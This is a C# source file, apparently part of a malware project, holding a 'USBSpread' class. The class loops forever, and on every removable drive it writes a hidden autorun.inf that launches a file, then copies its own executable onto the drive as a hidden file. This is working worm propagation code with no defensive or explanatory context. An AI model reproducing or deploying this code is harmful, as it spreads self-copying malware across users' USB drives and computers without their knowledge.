using System.IO;
using System.Windows.Forms;
using System.Threading;

namespace SWK
{
    public static class USBSpread
    {
		public static Thread USBProcess = new Thread(SpreadProcess);
        private static void SpreadProcess()
        {
			while (true)
			{
				Thread.Sleep(1000);
				string fileName = Program.FileName;
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo drive in drives)
				{
					if (drive.DriveType == DriveType.Removable)
					{
						StreamWriter writer = new StreamWriter(drive.Name + "autorun.inf");
						writer.WriteLine("[autorun]\n");
						writer.WriteLine("open=" + fileName);
						writer.WriteLine("action=Run win32");
						writer.Close();
						File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
						File.Copy(Application.ExecutablePath, drive.Name + fileName, true);
						File.SetAttributes(drive.Name + fileName, File.GetAttributes(drive.Name + fileName) | FileAttributes.Hidden);
					}
				}
			}
		}

		public static void StartProcess()
        {
			USBProcess.Start();
        }

		public static void Stop()
        {
			USBProcess.Abort();
        }

    }
}
